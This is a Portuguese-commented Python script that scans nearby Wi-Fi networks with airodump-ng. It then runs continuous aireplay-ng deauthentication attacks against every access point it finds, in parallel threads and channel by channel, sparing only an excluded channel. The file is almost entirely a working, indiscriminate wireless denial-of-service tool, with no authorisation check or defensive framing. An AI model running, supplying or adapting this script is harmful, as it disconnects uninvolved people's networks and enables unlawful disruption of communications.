#!/usr/bin/env python3
import subprocess
import time
import threading
import argparse
from queue import Queue

def parse_args():
    parser = argparse.ArgumentParser(description='Script de Deauth com filtro de canal')
    parser.add_argument('--exclude-channel', type=int, default=9,
                       help='Canal(s) a ser(em) excluído(s). Pode ser múltiplo: --exclude-channel 1 2 3')
    return parser.parse_args()

def run_airdump(duration=60, exclude_channels=None):
    """Executa airodump durante o tempo especificado e retorna BSSIDs e canais"""
    print(f"[*] Iniciando airodump-ng por {duration} segundos...")
    cmd = ["airodump-ng", "--output-format", "csv", "-w", "scan", "wlan0mon"]
    process = subprocess.Popen(cmd)
    time.sleep(duration)
    process.terminate()
    
    # Processar CSV gerado
    bssids_channels = []
    try:
        with open("scan-01.csv") as f:
            for line in f:
                if "BSSID" in line:
                    continue
                parts = line.strip().split(",")
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    # Filtrar canais excluídos
                    if bssid and channel and int(channel) not in exclude_channels:
                        bssids_channels.append((bssid, channel))
                        print(f"[+] BSSID: {bssid}, Canal: {channel}")
    except Exception as e:
        print(f"[!] Erro ao processar CSV: {e}")
    
    return bssids_channels

def set_channel(channel):
    """Define o canal usando iw"""
    print(f"[*] Alterando para o canal {channel}...")
    result = subprocess.run(["iw", "dev", "wlan0mon", "set", "channel", str(channel)], 
                           capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] Canal alterado para {channel}")
    else:
        print(f"[!] Falha ao alterar canal: {result.stderr}")

def deauth_single_bssid(bssid, duration=30):
    """Executa aireplay deauth em um único BSSID"""
    print(f"[*] Iniciando deauth no BSSID: {bssid}")
    try:
        cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, "wlan0mon"]
        process = subprocess.Popen(cmd)
        time.sleep(duration)
        process.terminate()
        print(f"[+] Deauth concluído para {bssid}")
    except Exception as e:
        print(f"[!] Erro no BSSID {bssid}: {e}")

def deauth_all_in_parallel(bssids, duration=30):
    """Executa deauth em todos os BSSIDs em paralelo"""
    print(f"[*] Iniciando deauth simultâneo em {len(bssids)} BSSIDs por {duration} segundos...")
    threads = []
    
    for bssid in bssids:
        thread = threading.Thread(target=deauth_single_bssid, args=(bssid, duration))
        threads.append(thread)
        thread.start()
    
    # Aguardar todas as threads terminarem
    for thread in threads:
        thread.join()
    
    print("[+] Deauth simultâneo concluído")

def main():
    args = parse_args()
    exclude_channels = set([args.exclude_channel]) if isinstance(args.exclude_channel, int) else set(args.exclude_channel)
    
    print(f"[*] Script de Deauth Started")
    print(f"[*] Excluindo canais: {exclude_channels}")
    print("[*] Iniciando coleta de dados...")
    
    # Coletar BSSIDs e canais
    bssids_channels = run_airdump(60, exclude_channels)
    
    if not bssids_channels:
        print("[!] Nenhum BSSID coletado. Saindo.")
        return
    
    # Agrupar por canal
    channel_map = {}
    for bssid, channel in bssids_channels:
        if channel not in channel_map:
            channel_map[channel] = []
        channel_map[channel].append(bssid)
    
    print("\n[*] BSSIDs coletados:")
    for channel, bssids in channel_map.items():
        print(f"Canal {channel}: {len(bssids)} BSSIDs")
        for bssid in bssids:
            print(f"  - {bssid}")
    
    # Executar deauths
    channels = sorted(channel_map.keys())
    print(f"\n[*] Executando deauths nos canais: {channels}")
    
    for channel in channels:
        print(f"\n[*] Processando canal {channel}...")
        set_channel(channel)
        
        bssids = channel_map[channel]
        if bssids:
            deauth_all_in_parallel(bssids, 30)
        else:
            print(f"[!] Nenhum BSSID encontrado no canal {channel}")
    
    # Voltar para o canal 1
    print("\n[*] Retornando ao canal 1...")
    set_channel(1)
    print("[+] Script concluído")

if __name__ == "__main__":
    main()
